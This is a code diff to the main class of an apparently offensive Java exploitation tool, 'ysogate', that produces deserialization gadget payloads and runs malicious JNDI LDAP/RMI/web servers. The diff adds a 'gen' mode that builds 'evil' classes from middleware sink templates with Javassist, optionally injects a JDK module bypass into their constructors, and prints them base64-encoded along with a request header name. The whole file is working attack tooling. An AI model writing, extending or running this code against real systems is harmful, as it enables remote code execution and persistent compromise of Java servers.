@@ -1,23 +1,34 @@
 package com.h2tg.ysogate;
 
-import java.io.FileOutputStream;
-import java.io.OutputStream;
-import java.io.PrintWriter;
+import java.io.*;
+import java.sql.SQLOutput;
 import java.util.*;
+import java.util.stream.Collectors;
+
 import com.h2tg.ysogate.config.Config;
+import com.h2tg.ysogate.config.GenConfig;
 import com.h2tg.ysogate.config.JndiConfig;
 import com.h2tg.ysogate.exploit.server.LDAPServer;
 import com.h2tg.ysogate.exploit.server.RMIServer;
 import com.h2tg.ysogate.exploit.server.WebServer;
+import com.h2tg.ysogate.utils.CtClassUtils;
+import javassist.*;
+import javassist.bytecode.AccessFlag;
 import org.apache.commons.cli.*;
 import com.h2tg.ysogate.payloads.CommandObjectPayload;
 import com.h2tg.ysogate.payloads.CommandObjectPayload.Utils;
 import org.apache.commons.codec.binary.Base64OutputStream;
-import com.h2tg.ysogate.annotation.Authors;
 import com.h2tg.ysogate.annotation.Dependencies;
+import org.reflections.Reflections;
+import org.reflections.scanners.Scanners;
+import org.reflections.util.ClasspathHelper;
+import org.reflections.util.ConfigurationBuilder;
+
+import static com.h2tg.ysogate.utils.CtClassUtils.bypassJDKModuleBody;
 
 @SuppressWarnings("rawtypes")
-public class Main {
+public class Main
+{
 
     private static final String PREFIX = "\u001B[32m[root]#~\u001B[0m  ";
     private static final String ERR_PREFIX = "\u001B[31m[root]#~\u001B[0m  ";
@@ -26,8 +37,10 @@ public class Main {
     private static Options commonOptions;
     private static Options payloadOptions;
     private static Options jndiOptions;
+    private static Options genOptions;
 
-    public static void main(final String[] args) {
+    public static void main(final String[] args)
+    {
         initializeOptions();
 
         try {
@@ -41,7 +54,7 @@ public class Main {
             String mode = cmdLine.getOptionValue("mode");
             if (mode == null) {
                 printUsage(null);
-                throw new ParseException("Mode (-m) is required. Use 'payload' or 'jndi'.");
+                throw new ParseException("Mode (-m) is required. Use 'payload' or 'jndi' or 'gen'.");
             }
 
             switch (mode.toLowerCase()) {
@@ -51,9 +64,12 @@ public class Main {
                 case "jndi":
                     handleJNDIMode(args);
                     break;
+                case "gen":
+                    handleGenMode(args);
+                    break;
                 default:
                     printUsage(null);
-                    throw new ParseException("Invalid mode. Use 'payload' or 'jndi'.");
+                    throw new ParseException("Invalid mode. Use 'payload' or 'jndi' or 'gen'.");
             }
         } catch (ParseException e) {
             printError("Parameter input error: " + e.getMessage());
@@ -61,9 +77,10 @@ public class Main {
         }
     }
 
-    private static void initializeOptions() {
+    private static void initializeOptions()
+    {
         commonOptions = new Options()
-                .addOption("m", "mode", true, "Operation mode: 'payload' or 'jndi'")
+                .addOption("m", "mode", true, "Operation mode: 'payload' or 'jndi' or 'gen'")
                 .addOption("h", "help", false, "Show help message")
         ;
 
@@ -85,14 +102,24 @@ public class Main {
 //                .addOption("u", "url", true, "URL for JNDI resource")
         ;
 
+        genOptions = new Options()
+                .addOption("t", "type", true, "Middleware type")
+                .addOption("s", "sink", true, "Evil sink template")
+                .addOption("f", "format", true, "Output format")
+                .addOption("name", "classname",true, "Evil Class Name")
+                .addOption("bypass", false, "ByPass JDK Module")
+        ;
+
         // Add common options to both payload and JNDI options
         for (Option opt : commonOptions.getOptions()) {
             payloadOptions.addOption(opt);
             jndiOptions.addOption(opt);
+            genOptions.addOption(opt);
         }
     }
 
-    private static void handlePayloadMode(String[] args) throws ParseException {
+    private static void handlePayloadMode(String[] args) throws ParseException
+    {
         cmdLine = new DefaultParser().parse(payloadOptions, args);
 
         if (cmdLine.hasOption("help")) {
@@ -113,7 +140,8 @@ public class Main {
         generatePayload(cmdLine.getOptionValue("gadget"), cmdLine.getOptionValue("parameters"));
     }
 
-    private static void handleJNDIMode(String[] args) throws ParseException {
+    private static void handleJNDIMode(String[] args) throws ParseException
+    {
         cmdLine = new DefaultParser().parse(jndiOptions, args);
 
         if (cmdLine.hasOption("help")) {
@@ -157,7 +185,81 @@ public class Main {
         webThread.start();
     }
 
-    private static void generatePayload(String payloadType, String parameters) {
+    private static void handleGenMode(String[] args) throws ParseException
+    {
+        cmdLine = new DefaultParser().parse(genOptions, args);
+        if (cmdLine.hasOption("help")) {
+            printUsage(genOptions);
+            return;
+        }
+//        showTemplates();
+
+        if (!cmdLine.hasOption("sink") || !cmdLine.hasOption("type")) {
+            printUsage(genOptions);
+            showTemplates();
+            throw new ParseException("Gen mode requires -t and -s options to specify middleware type and evil sink template.");
+        }
+
+        String format = cmdLine.getOptionValue("format") == null ? GenConfig.formatType : cmdLine.getOptionValue("format");
+        String className = cmdLine.getOptionValue("classname") == null ? GenConfig.className : cmdLine.getOptionValue("classname");
+        GenConfig.bypassModule = cmdLine.hasOption("bypass");
+
+        if (GenConfig.bypassModule && !className.startsWith("org.springframework.expression")) {
+            printError("Class name must start with 'org.springframework.expression' to bypass JDK module.");
+            return;
+        }
+
+        ClassPool pool = ClassPool.getDefault();
+        CtClass ctClass;
+        byte[] clazzbytes = null;
+        try{
+            pool.insertClassPath(new ClassClassPath(Main.class));
+            ctClass = pool.getCtClass("com.h2tg.ysogate.template." + cmdLine.getOptionValue("type") +"."+ cmdLine.getOptionValue("sink"));
+            ctClass.getClassFile().setVersionToJava5();
+            try {
+                if (GenConfig.reqHeaderName != null) {
+                    CtClassUtils.addMethod(ctClass, "getReqHeaderName", String.format("{return \"%s\";}", GenConfig.reqHeaderName));
+                }
+                ctClass.setName(className);
+                if (GenConfig.bypassModule) {
+                    CtMethod ctMethod = new CtMethod(CtClass.voidType, "bypassJDKModule", new CtClass[0], ctClass);
+                    ctMethod.setModifiers(AccessFlag.PUBLIC);
+                    ctMethod.setBody(bypassJDKModuleBody());
+                    ctClass.addMethod(ctMethod);
+
+                    // 添加 bypassJDKModule 调用
+                    CtConstructor constructor = ctClass.getConstructors()[0];
+                    constructor.setModifiers(javassist.Modifier.setPublic(constructor.getModifiers()));
+                    constructor.insertBeforeBody("bypassJDKModule();");
+                }
+            } catch (Exception e) {
+                e.printStackTrace();
+            }
+
+            CtClassUtils.removeSourceFileAttribute(ctClass);
+            ctClass.getClassFile().setVersionToJava5();
+            clazzbytes = ctClass.toBytecode();
+            ctClass.defrost();
+            ctClass.detach();
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+
+
+        String result = null;
+        if (format.equals("base64")) {
+            result= Base64.getEncoder().encodeToString(clazzbytes);
+        }
+
+        System.out.println("Evil Class Name: " + className);
+        System.out.println(result);
+        System.out.println("Evil Class Length: " + clazzbytes.length);
+        System.out.println("Request Header Name: " + GenConfig.reqHeaderName);
+
+    }
+
+    private static void generatePayload(String payloadType, String parameters)
+    {
         try {
             final Class<? extends CommandObjectPayload> payloadClass = Utils.getPayloadClass(payloadType);
             if (payloadClass == null) {
@@ -178,7 +280,7 @@ public class Main {
                 } else {
                     Serializer.serialize(object, out);
                 }
-                CommandObjectPayload.Utils.releasePayload(payload, object);
+                Utils.releasePayload(payload, object);
             }
         } catch (Exception e) {
             printError("Error while generating or serializing payload: " + e.getMessage());
@@ -186,7 +288,8 @@ public class Main {
         }
     }
 
-    private static OutputStream getOutputStream() throws Exception {
+    private static OutputStream getOutputStream() throws Exception
+    {
         if (Config.WRITE_FILE) {
             return new FileOutputStream(Config.FILE);
         } else if (Config.BASE64_ENCODE) {
@@ -196,14 +299,16 @@ public class Main {
         }
     }
 
-    private static void printUsage(Options options) {
+    private static void printUsage(Options options)
+    {
         HelpFormatter formatter = new HelpFormatter();
         formatter.setWidth(100);
 
         printInfo("H4cking to the Gate !");
         printInfo("Usage:");
         printInfo("Payload Mode: java -jar ysogate-[version]-all.jar -m payload [PAYLOAD OPTIONS]");
-        printInfo("JNDI Mode:    java -jar ysogate-[version]-all.jar -m jndi [JNDI OPTIONS]");
+        printInfo("JNDI    Mode: java -jar ysogate-[version]-all.jar -m jndi    [JNDI OPTIONS]");
+        printInfo("Gen     Mode: java -jar ysogate-[version]-all.jar -m gen     [GEN OPTIONS]");
         System.out.println();
 
         if (options == null) {
@@ -220,26 +325,33 @@ public class Main {
             printInfo("JNDI Mode Options:");
             formatter.printOptions(new PrintWriter(System.out, true), formatter.getWidth(), jndiOptions,
                     formatter.getLeftPadding(), formatter.getDescPadding());
+        } else if (options == genOptions) {
+            printInfo("Gen Mode Options:");
+            formatter.printOptions(new PrintWriter(System.out, true), formatter.getWidth(), genOptions,
+                    formatter.getLeftPadding(), formatter.getDescPadding());
         }
     }
 
-    public static void printInfo(String message) {
+    public static void printInfo(String message)
+    {
         System.out.println(PREFIX + message);
     }
 
-    private static void printError(String message) {
+    private static void printError(String message)
+    {
         System.err.println(ERR_PREFIX + "Error: " + message);
     }
 
-    private static void showPayloads() {
+    private static void showPayloads()
+    {
         System.out.println("\r\n");
         System.out.println(PREFIX + "Available payload types:");
-        final List<Class<? extends CommandObjectPayload>> payloadClasses = new ArrayList<>(CommandObjectPayload.Utils.getPayloadClasses());
+        final List<Class<? extends CommandObjectPayload>> payloadClasses = new ArrayList<>(Utils.getPayloadClasses());
         Collections.sort(payloadClasses, new Strings.ToStringComparator()); // alphabetize
 
         final List<String[]> rows = new LinkedList<>();
-        rows.add(new String[]{"Payload","Dependencies"});
-        rows.add(new String[]{"-------","------------"});
+        rows.add(new String[]{"Payload", "Dependencies"});
+        rows.add(new String[]{"-------", "------------"});
         for (Class<? extends CommandObjectPayload> payloadClass : payloadClasses) {
             rows.add(new String[]{
                     payloadClass.getSimpleName(),
@@ -255,5 +367,14 @@ public class Main {
         }
 
         System.err.println("\r\n");
+    }
+
+    public static void showTemplates() {
+        Reflections reflections = new Reflections("com.h2tg.ysogate.template"); // Scanners.TypesAnnotated 扫描所有类型的类
+        Set<Class<?>> classes = reflections.getSubTypesOf(Object.class);
+        System.out.println("Available templates:");
+        for (Class<?> clazz : classes) {
+            System.out.println("    " + clazz.getSimpleName());
+        }
     }
 }
